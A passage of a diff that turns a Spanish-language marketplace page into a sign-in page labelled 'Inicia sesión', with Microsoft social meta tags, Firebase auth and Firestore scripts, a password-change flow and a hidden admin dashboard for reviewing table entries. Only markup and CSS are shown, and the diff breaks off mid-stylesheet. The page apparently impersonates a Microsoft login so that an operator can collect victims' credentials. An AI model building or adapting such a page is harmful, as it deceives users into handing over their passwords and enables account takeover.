@@ -3,1574 +3,2316 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MarketPlace - Compra y Vende Artículos</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title> Inicia sesión </title>
+    
+    <!-- ========== FAVICON ========== -->
+    <link rel="icon" type="image/x-icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s">
+    
+    <!-- Meta tags para redes sociales -->
+    <meta property="og:title" content="Microsoft">
+    <meta property="og:description" content="Inicia sesión">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s">
+    <meta property="og:url" content="">
+    <meta name="twitter:card" content="summary_large_image">
+    
+    <!-- Preconexión para recursos externos -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <link rel="preconnect" href="https://www.gstatic.com">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Cormorant+Garamond:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
+    
     <style>
-        :root {
-            --primary: #6366f1;
-            --primary-dark: #4f46e5;
-            --primary-light: #818cf8;
-            --secondary: #ec4899;
-            --accent: #f59e0b;
-            --dark: #0f172a;
-            --light: #f8fafc;
-            --gray: #64748b;
-            --success: #10b981;
-            --danger: #ef4444;
-            --gradient: linear-gradient(135deg, #6366f1 0%, #ec4899 100%);
-        }
+        /* ========== ESTILOS ORIGINALES ========== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { height: 100%; font-family: 'Roboto', 'Segoe UI', Arial, sans-serif; }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--light);
-            color: var(--dark);
-            overflow-x: hidden;
-        }
-
-        /* Animaciones */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(-100%); }
-            to { transform: translateX(0); }
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        @keyframes shimmer {
-            0% { background-position: -1000px 0; }
-            100% { background-position: 1000px 0; }
-        }
-
-        /* Header */
-        header {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 1px solid rgba(99, 102, 241, 0.1);
-            transition: all 0.3s ease;
-        }
-
-        .header-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 1rem 2rem;
+        /* Login original */
+        .login-container {
+            min-height: 100vh;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
+            background: #f5f5f5;
+            padding: 20px;
         }
 
-        .logo {
-            font-size: 1.8rem;
-            font-weight: 800;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            cursor: pointer;
-        }
-
-        .search-bar {
-            flex: 1;
-            max-width: 600px;
-            margin: 0 2rem;
-            position: relative;
-        }
-
-        .search-bar input {
-            width: 100%;
-            padding: 0.8rem 1.5rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 50px;
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
+        .login-card {
             background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
-        .search-bar input:focus {
+        .login-header {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .login-logo {
+            width: 180px;
+            height: auto;
+            max-height: 100px;
+            margin-bottom: 20px;
+            object-fit: contain;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .security-message-header {
+            text-align: center;
+            font-size: 13px;
+            color: #5f6368;
+            font-weight: 400;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1);
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
 
-        .search-bar button {
-            position: absolute;
-            right: 5px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: var(--gradient);
-            border: none;
-            color: white;
-            padding: 0.6rem 1.2rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .nav-actions {
+        .remember-me {
             display: flex;
-            gap: 1rem;
             align-items: center;
+            gap: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #5f6368;
         }
 
-        .btn {
-            padding: 0.8rem 1.5rem;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
+        .remember-me input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-size: 0.95rem;
         }
 
-        .btn-primary {
-            background: var(--gradient);
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
             color: white;
-            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--dark);
-            border: 2px solid #e2e8f0;
-        }
-
-        .btn-secondary:hover {
-            border-color: var(--primary);
-            color: var(--primary);
-        }
-
-        .btn-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+            height: 44px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: white;
-            border: 2px solid #e2e8f0;
-            cursor: pointer;
-            transition: all 0.3s;
-            position: relative;
         }
 
-        .btn-icon:hover {
-            background: var(--primary);
-            color: white;
-            border-color: var(--primary);
-            transform: scale(1.1);
+        .login-button:hover:not(:disabled) {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
 
-        .badge {
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: var(--secondary);
-            color: white;
-            font-size: 0.7rem;
+        .login-button:disabled {
+            opacity: 0.9;
+            cursor: not-allowed;
+        }
+
+        .login-button-text {
+            transition: opacity 0.3s ease;
+        }
+
+        .login-button-loading .login-button-text {
+            opacity: 0;
+        }
+
+        .login-spinner {
             width: 20px;
             height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-        }
-
-        /* Hero Section */
-        .hero {
-            margin-top: 80px;
-            padding: 4rem 2rem;
-            background: linear-gradient(135deg, #f0f9ff 0%, #fff1f2 100%);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before {
-            content: '';
+            animation: spin 0.6s linear infinite;
             position: absolute;
-            top: -50%;
-            right: -10%;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(99, 102, 241, 0.1) 0%, transparent 70%);
-            border-radius: 50%;
-            animation: float 6s ease-in-out infinite;
+            top: 50%;
+            left: 50%;
+            margin: -10px 0 0 -10px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
 
-        .hero-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
+        .login-button-loading .login-spinner {
+            opacity: 1;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Páginas de cambio de contraseña y éxito */
+        .password-change-container {
+            min-height: 100vh;
+            display: none;
+            justify-content: center;
             align-items: center;
+            background: #f5f5f5;
+            padding: 20px;
         }
 
-        .hero-content h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 1.5rem;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        .hero-content h1 span {
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .hero-content p {
-            font-size: 1.2rem;
-            color: var(--gray);
-            margin-bottom: 2rem;
-            line-height: 1.6;
-            animation: fadeIn 0.8s ease-out 0.2s backwards;
-        }
-
-        .hero-stats {
-            display: flex;
-            gap: 2rem;
-            margin-top: 3rem;
-            animation: fadeIn 0.8s ease-out 0.4s backwards;
-        }
-
-        .stat {
-            text-align: center;
-        }
-
-        .stat-number {
-            font-size: 2rem;
-            font-weight: 800;
-            color: var(--primary);
-        }
-
-        .stat-label {
-            font-size: 0.9rem;
-            color: var(--gray);
-            margin-top: 0.3rem;
-        }
-
-        .hero-image {
-            position: relative;
-            animation: fadeIn 0.8s ease-out 0.6s backwards;
-        }
-
-        .hero-image img {
+        .password-change-card {
+            background: white;
             width: 100%;
-            border-radius: 24px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-            transform: perspective(1000px) rotateY(-5deg);
-            transition: transform 0.5s;
-        }
-
-        .hero-image:hover img {
-            transform: perspective(1000px) rotateY(0deg);
-        }
-
-        .floating-card {
-            position: absolute;
-            background: white;
-            padding: 1rem 1.5rem;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            animation: float 3s ease-in-out infinite;
-        }
-
-        .floating-card.card-1 {
-            top: 10%;
-            left: -10%;
-            animation-delay: 0s;
-        }
-
-        .floating-card.card-2 {
-            bottom: 10%;
-            right: -10%;
-            animation-delay: 1.5s;
-        }
-
-        /* Categories */
-        .categories {
-            padding: 4rem 2rem;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 2rem;
-        }
-
-        .section-title {
-            font-size: 2rem;
-            font-weight: 700;
-        }
-
-        .category-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .category-card {
-            background: white;
-            padding: 1.5rem;
-            border-radius: 20px;
+            max-width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 2px solid transparent;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
         }
 
-        .category-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--primary);
-            box-shadow: 0 20px 25px -5px rgba(99, 102, 241, 0.15);
+        .password-change-logo {
+            width: 150px;
+            height: auto;
+            margin: 0 auto 20px;
+            display: block;
         }
 
-        .category-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #f0f9ff 0%, #fff1f2 100%);
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            font-size: 1.5rem;
-            color: var(--primary);
-            transition: all 0.3s;
+        .password-change-header h2 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 10px;
         }
 
-        .category-card:hover .category-icon {
-            background: var(--gradient);
-            color: white;
-            transform: scale(1.1) rotate(5deg);
+        .password-change-header p {
+            color: #5f6368;
+            font-size: 14px;
         }
 
-        /* Filters */
-        .filters {
-            padding: 0 2rem 2rem;
-            max-width: 1400px;
-            margin: 0 auto;
-            display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
-            align-items: center;
+        .success-icon {
+            color: #34A853;
+            font-size: 48px;
+            margin: 15px 0;
         }
 
-        .filter-chip {
-            padding: 0.6rem 1.2rem;
-            background: white;
-            border: 2px solid #e2e8f0;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.9rem;
+        .security-message {
+            background-color: #e8f5e9;
+            border-left: 4px solid #34A853;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            text-align: left;
+        }
+
+        .security-message p {
+            color: #2e7d32;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 5px;
+        }
+
+        .security-message i {
+            color: #34A853;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        /* Notificación simple */
+        .simple-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            color: #ea4335;
+            font-size: 14px;
             font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
+            z-index: 10000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            text-align: right;
         }
 
-        .filter-chip:hover, .filter-chip.active {
-            background: var(--primary);
-            color: white;
-            border-color: var(--primary);
-            transform: scale(1.05);
+        .simple-notification.show {
+            opacity: 1;
         }
 
-        /* Products Grid */
-        .products-section {
-            padding: 2rem;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 2rem;
-        }
-
-        .product-card {
-            background: white;
-            border-radius: 24px;
-            overflow: hidden;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            cursor: pointer;
-            position: relative;
-            animation: fadeIn 0.6s ease-out backwards;
-        }
-
-        .product-card:nth-child(1) { animation-delay: 0.1s; }
-        .product-card:nth-child(2) { animation-delay: 0.2s; }
-        .product-card:nth-child(3) { animation-delay: 0.3s; }
-        .product-card:nth-child(4) { animation-delay: 0.4s; }
-
-        .product-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.2);
-        }
-
-        .product-image {
-            position: relative;
-            height: 240px;
-            overflow: hidden;
-            background: #f1f5f9;
-        }
-
-        .product-image img {
+        /* Overlay de carga */
+        .page-transition-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            transition: transform 0.5s;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+            backdrop-filter: blur(5px);
         }
 
-        .product-card:hover .product-image img {
-            transform: scale(1.1);
+        .page-transition-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
         }
 
-        .product-badge {
+        .page-transition-text {
+            margin-top: 20px;
+            color: #1a73e8;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        /* ========== ADMIN LOGIN ========== */
+        #admin-login-page {
+            min-height: 100vh;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            background: #f5f5f5;
+            padding: 20px;
+            position: relative;
+        }
+
+        .admin-login-card {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .admin-login-logo {
+            width: 150px;
+            height: auto;
+            margin: 0 auto 20px;
+            display: block;
+        }
+
+        .admin-form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+
+        .admin-form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: all 0.2s ease;
+            background: white;
+        }
+
+        .admin-form-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+
+        .admin-password-toggle {
             position: absolute;
-            top: 1rem;
-            left: 1rem;
-            padding: 0.4rem 0.8rem;
-            border-radius: 50px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            text-transform: uppercase;
+            right: 15px;
+            top: 38px;
+            background: none;
+            border: none;
+            color: #5f6368;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 0;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .admin-password-toggle:hover {
+            color: #1a73e8;
+        }
+
+        .admin-button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .admin-button:hover:not(:disabled) {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .admin-button:disabled {
+            opacity: 0.9;
+            cursor: not-allowed;
+        }
+
+        .admin-button .button-text {
+            transition: opacity 0.3s ease;
+        }
+
+        .admin-button.loading .button-text {
+            opacity: 0;
+        }
+
+        .admin-button .button-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin: -10px 0 0 -10px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .admin-button.loading .button-spinner {
+            opacity: 1;
+        }
+
+        .back-link {
+            position: absolute;
+            top: 24px;
+            left: 24px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #5f6368;
+            cursor: pointer;
+            transition: color 0.2s;
             z-index: 2;
+            text-decoration: none;
         }
 
-        .badge-new {
-            background: var(--success);
-            color: white;
+        .back-link:hover {
+            color: #1a73e8;
         }
 
-        .badge-used {
-            background: var(--accent);
-            color: white;
+        /* ========== DASHBOARD OSCURO ========== */
+        .dashboard-container {
+            display: none;
+            min-height: 100vh;
+            background: #0a0a0c;
         }
 
-        .badge-sale {
-            background: var(--danger);
-            color: white;
+        .app-container {
+            display: flex;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
         }
 
-        .product-actions {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
+        /* Overlay para cerrar menú */
+        .sidebar-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1999;
+            display: none;
+            backdrop-filter: blur(2px);
+        }
+
+        .sidebar-overlay.active {
+            display: block;
+        }
+
+        /* Sidebar Oscuro */
+        .sidebar {
+            width: 280px;
+            min-height: 100vh;
+            background: #141418;
             display: flex;
             flex-direction: column;
-            gap: 0.5rem;
-            opacity: 0;
-            transform: translateX(20px);
-            transition: all 0.3s;
+            flex-shrink: 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            overflow-y: auto;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            z-index: 2000;
+            border-right: 1px solid #2a2a32;
         }
 
-        .product-card:hover .product-actions {
-            opacity: 1;
+        .sidebar.active {
             transform: translateX(0);
         }
 
-        .action-btn {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: white;
-            border: none;
+        .sidebar-header {
+            padding: 28px 24px 20px;
+            border-bottom: 1px solid #2a2a32;
+        }
+
+        .sidebar-logo {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #ffffff;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 10px;
+            font-style: italic;
+        }
+
+        .sidebar-logo::before {
+            content: '✦';
+            color: #d4af37;
+            font-size: 1.5rem;
+        }
+
+        .sidebar-logo::after {
+            content: '✦';
+            color: #d4af37;
+            font-size: 1.5rem;
+        }
+
+        .sidebar-nav {
+            flex: 1;
+            padding: 24px 0;
+        }
+
+        .nav-section-label {
+            padding: 12px 24px 6px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: #70707a;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 24px;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            color: #b0b0c0;
+            font-size: 14px;
+            font-weight: 400;
+            border-left: 3px solid transparent;
+        }
+
+        .nav-item:hover {
+            background: rgba(212, 175, 55, 0.1);
+            color: #d4af37;
+        }
+
+        .nav-item.active {
+            background: rgba(212, 175, 55, 0.15);
+            color: #d4af37;
+            border-left-color: #d4af37;
+        }
+
+        .nav-item-icon {
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+            color: #d4af37;
+        }
+
+        .sidebar-footer {
+            padding: 16px 24px;
+            border-top: 1px solid #2a2a32;
+        }
+
+        .logout-btn {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            color: #b55a4a;
+            font-size: 14px;
+            transition: all 0.2s;
+            border: none;
+            background: transparent;
+            width: 100%;
+            font-family: inherit;
+        }
+
+        .logout-btn:hover {
+            background: rgba(181, 90, 74, 0.15);
+        }
+
+        .logout-btn .nav-item-icon {
+            color: #b55a4a;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            margin-left: 0;
+            width: 100%;
+        }
+
+        .topbar {
+            background: #141418;
+            border-bottom: 1px solid #2a2a32;
+            padding: 18px 36px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .topbar-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #ffffff;
+        }
+
+        .topbar-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .topbar-date {
+            font-size: 14px;
+            color: #b0b0c0;
+        }
+
+        .content-area {
+            flex: 1;
+            padding: 32px 36px;
+            overflow-y: auto;
+            background: #0a0a0c;
+        }
+
+        /* Panels */
+        .panel {
+            display: none;
+            animation: panelIn 0.3s ease;
+        }
+
+        .panel.active {
+            display: block;
+        }
+
+        @keyframes panelIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .stat-card {
+            background: #141418;
+            border: 1px solid #2a2a32;
+            border-radius: 8px;
+            padding: 24px;
+            transition: all 0.2s ease;
+        }
+
+        .stat-card:hover {
+            border-color: #d4af37;
+        }
+
+        .stat-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #b0b0c0;
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 36px;
+            font-weight: 400;
+            color: #ffffff;
+        }
+
+        .stat-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            float: right;
+            font-size: 18px;
+            background: rgba(212, 175, 55, 0.15);
+            color: #d4af37;
+        }
+
+        /* Cards */
+        .card {
+            background: #141418;
+            border: 1px solid #2a2a32;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        .card-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid #2a2a32;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 500;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-body {
+            padding: 24px;
+        }
+
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 800px;
+        }
+
+        thead th {
+            padding: 12px 16px;
+            text-align: left;
+            font-size: 12px;
+            font-weight: 700;
+            color: #b0b0c0;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            background: #0a0a0c;
+            border-bottom: 1px solid #2a2a32;
+        }
+
+        tbody tr {
+            border-bottom: 1px solid #2a2a32;
+            transition: background 0.15s;
+        }
+
+        tbody tr:last-child {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: #1a1a20;
+        }
+
+        tbody td {
+            padding: 14px 16px;
+            font-size: 14px;
+            color: #ffffff;
+            vertical-align: middle;
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .badge-active {
+            background: rgba(58, 138, 106, 0.2);
+            color: #4caf80;
+        }
+
+        /* Checkbox */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #70707a;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            background: transparent;
+        }
+
+        .checkbox.checked {
+            background: #d4af37;
+            border-color: #d4af37;
+        }
+
+        .checkbox.checked::after {
+            content: "✓";
+            color: #000000;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        /* Selection Actions */
+        .selection-actions {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding: 15px 20px;
+            background: rgba(212, 175, 55, 0.1);
+            border-radius: 4px;
+            border: 1px solid #d4af37;
+        }
+
+        .selection-count {
+            font-weight: 500;
+            color: #d4af37;
+            font-size: 14px;
+        }
+
+        .selection-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        /* Action Buttons */
+        .card-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .action-btn {
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            border: 1px solid #2a2a32;
+            background: transparent;
+            color: #b0b0c0;
+            transition: all 0.15s;
+            font-family: inherit;
         }
 
         .action-btn:hover {
-            background: var(--primary);
-            color: white;
-            transform: scale(1.1);
+            background: #1a1a20;
+            color: #ffffff;
         }
 
-        .product-info {
-            padding: 1.5rem;
+        .action-btn.delete {
+            background: rgba(181, 90, 74, 0.15);
+            color: #b55a4a;
+            border-color: rgba(181, 90, 74, 0.3);
         }
 
-        .product-category {
-            font-size: 0.8rem;
-            color: var(--primary);
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 0.5rem;
+        .action-btn.delete:hover {
+            background: rgba(181, 90, 74, 0.25);
         }
 
-        .product-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            line-height: 1.4;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
+        .action-btn.view {
+            background: rgba(212, 175, 55, 0.15);
+            color: #d4af37;
+            border-color: rgba(212, 175, 55, 0.3);
         }
 
-        .product-meta {
+        .action-btn.view:hover {
+            background: rgba(212, 175, 55, 0.25);
+        }
+
+        /* Search */
+        .toolbar {
             display: flex;
-            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 20px;
             align-items: center;
-            margin-top: 1rem;
         }
 
-        .product-price {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: var(--dark);
+        .search-input {
+            flex: 1;
+            padding: 10px 14px;
+            border: 1px solid #2a2a32;
+            border-radius: 4px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
+            background: #0a0a0c;
+            color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s;
         }
 
-        .product-price .original {
-            font-size: 0.9rem;
-            color: var(--gray);
